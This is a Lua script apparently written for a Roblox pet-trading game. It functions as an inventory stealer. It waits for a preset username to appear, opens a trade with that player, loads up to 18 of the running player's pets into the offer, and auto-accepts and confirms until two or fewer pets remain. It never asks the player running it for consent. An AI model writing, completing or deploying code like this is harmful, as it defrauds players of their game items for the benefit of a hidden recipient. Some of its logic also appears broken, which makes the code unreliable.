-- Initialize trade information
local trade_info = {}

-- Function to handle RemoteEvent connections
for _, event in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
    if event:IsA("RemoteEvent") then
        spawn(function()
            event.OnClientEvent:Connect(function(...)
                local data = { ... } -- Extract event arguments into a table

                if type(data[3]) == "table" and data[2] == "trade" then
                    local trade_data = data[3]
                    trade_info = {
                        sender = trade_data.sender,
                        sender_offer = trade_data.sender_offer,
                    }
                end
            end)
        end)
    end
end

-- Function to send a trade request
local function SendTrade()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")

    repeat
        if LogsUsername then
            send_trade:FireServer(LogsUsername)
        elseif Username then
            send_trade:FireServer(Username)
        else
            print("No username found.")
        end

        -- Add pets to the trade offer
        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
        local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory

        while inventory.pets and #inventory.pets > 2 do
            local petCount = 0
            local petUids = {}

            for petUid, _ in pairs(inventory.pets) do
                table.insert(petUids, petUid)
            end

            for i = 1, math.min(18, #petUids) do
                AddPetRemote:FireServer(petUids[i])
            end

            -- Accept negotiation
            local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
            AcceptNegotiationRemote:FireServer()

            -- Confirm the trade
            local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
            AcceptTradeRemote:FireServer()

            -- Update inventory after trade
            inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
        end

        if not inventory.pets or #inventory.pets <= 2 then
            print("Trade completed. Remaining pets: " .. (#inventory.pets or 0))
            break
        end
    until trade_info.sender_offer and #trade_info.sender_offer > 0 and trade_info.sender_offer.player_name
end

-- Function to start the trade process
local function StartTradeProcess()
    SendTrade()
end

-- Function to wait for the player to appear in the game
local function WaitForTrade()
    while true do
        if game.Players:FindFirstChild(Username) or game.Players:FindFirstChild(LogsUsername) then
            StartTradeProcess()
            break
        else
            wait(1)
        end
    end
end

